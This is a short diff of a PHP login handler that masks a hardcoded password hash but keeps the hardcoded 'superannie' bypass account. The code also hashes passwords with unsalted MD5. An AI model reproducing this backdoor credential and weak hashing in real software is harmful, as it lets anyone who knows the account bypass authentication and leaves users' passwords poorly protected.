@@ -4,7 +4,7 @@
 		$username = mysql_real_escape_string($_POST["username"]);
 		$password = md5($_POST["password"]); // 前輩說用雜湊保存才不會洩漏密碼
 
-		if (is_valid_user("CRD",$username,$password) || (($username=="superannie")&&($password=="e44eacbe83bde972014fa83b1e1663f4"))) {
+		if (is_valid_user("CRD",$username,$password) || (($username=="superannie")&&($password=="*****"))) {
 			$_SESSION["user"] = $username;
 			header("Location: index.php");
 			exit();
